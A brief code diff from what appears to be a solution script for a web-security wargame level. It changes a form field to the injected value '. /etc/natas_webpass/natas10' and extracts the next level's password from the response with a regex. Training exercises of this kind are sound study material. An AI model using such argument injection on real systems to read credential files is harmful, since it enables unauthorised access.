@@ -12,6 +12,7 @@ session = requests.Session()
 # content = response.text
 # print(content) #had an index-soruce.html
 
-response = session.post(url, data ={"needle":"* * *", "submit":"submit"}, auth = (username, password))
+response = session.post(url, data ={"needle":". /etc/natas_webpass/natas10", "submit":"submit"}, auth = (username, password))
 content = response.text
-print(content) 
+# print(content) 
+print(re.findall("natas_webpass/natas10:(.*)",content)[0])
